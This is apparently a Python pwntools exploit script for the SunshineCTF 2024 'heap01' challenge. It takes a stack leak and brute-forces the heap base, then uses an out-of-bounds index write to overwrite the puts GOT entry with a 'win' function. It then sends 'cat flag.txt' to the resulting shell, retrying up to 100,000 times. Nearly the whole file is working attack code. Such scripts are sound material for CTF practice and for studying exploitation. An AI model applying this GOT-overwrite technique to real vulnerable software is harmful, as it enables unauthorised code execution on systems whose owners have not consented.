#!/usr/bin/env python3

from pwn import *
from rich import print
from tqdm import trange
import random

context.log_level = "error"

exe = ELF("./heap01_pwninit")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
if not args.GDB:
    context.timeout = 1

def getRanges(io):
    if not hasattr(io, "proc"):
        return {}, {"libc_32.so.6": (-1, -1)}

    mmap = open(f"/proc/{io.proc.pid}/maps").read()
    lines = mmap.strip().split("\n")
    
    sections = set(line.split(" ", 5)[5].strip() for line in lines)
    sections = [s for s in sections if s.strip()]
    sections = [section.split("/")[-1] for section in sections]

    ranges = {}
    for section in sections:
        # print(f"Section: {section}")
        section_lines = [line for line in lines if section in line]
        start_of_section = int(section_lines[0].split("-")[0], 16)
        end_of_section = int(section_lines[-1].split("-")[1].split(" ")[0], 16)
        ranges[section] = (start_of_section, end_of_section)
    
    return ranges

startTime = None
def conn():
    global startTime
    startTime = time.time()
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        context.terminal = ["tmux", "splitw", "-h"]
        r = process([exe.path])
        gdb.attach(r, gdbscript=GDBSCRIPT)
        # r = gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    elif args.BRUH:
        r = process([exe.path])
        print(r.pid)
    elif args.STRACE:
        r = process(["strace", "-o", "strace", exe.path])
    elif args.REMOTE:
        r = remote("2024.sunshinectf.games", 24006)
    else:
        print("No args specified")
        exit(1)

    return r


GDBSCRIPT = """
source tracer.py
b *0x0040139A 
c
"""

# def pwnThatShit(r, i):

def main():
    # context.log_level = "error"
    context.timeout = 1
    # for i in [0, 1, 8, 32, 128, 0x1000, 0x10000, 0x100000, 0x1000000, 0x10000000]:
    #     r = conn()
    #     pwnThatShit(r, str(i))
    #     print(r.recvall(timeout=1))
    
    r = conn()
    r.sendlineafter(b"leak?", b"yes")
    r.recvuntil(b"0x")
    stack_leak = int(r.recvline().strip(), 16)
    r.sendlineafter(b"size:", str(0x130).encode())

    if not args.REMOTE and (args.DEBUG_LEAK and random.random() < 0.1):
        DEBUG_HEAP_LEAK = getRanges(r)["[heap]"][0]
        print("USING DEBUG HEAP LEAK")
    else:
        DEBUG_HEAP_LEAK = 0x18b1000
    # print(f"DEBUG_HEAP_LEAK: {hex(DEBUG_HEAP_LEAK)}")

    offset_to_heap = 0x4962a0 - 0x495000 + 0x10

    firstMalloc = DEBUG_HEAP_LEAK + offset_to_heap
    TARGET = exe.got["puts"]

    assert (TARGET - firstMalloc) % 8 == 0
    r.sendlineafter(b"Index:",  str((TARGET - firstMalloc) // 8).encode())
    r.sendlineafter(b"Value:",  str(exe.symbols["win"]).encode())

    r.sendline(b"cat flag.txt")
    k = r.recvall(timeout=0.1 if args.LOCAL else 1)
    if "sun{".encode() in k:
        open("won.txt", "wb").write(k)
        print(k)
        exit()
    r.close()

if __name__ == "__main__":
    open("bruh.txt", "a+").write(f"{' '.join(sys.argv)}\n")
    for i in trange(100_000):
        main()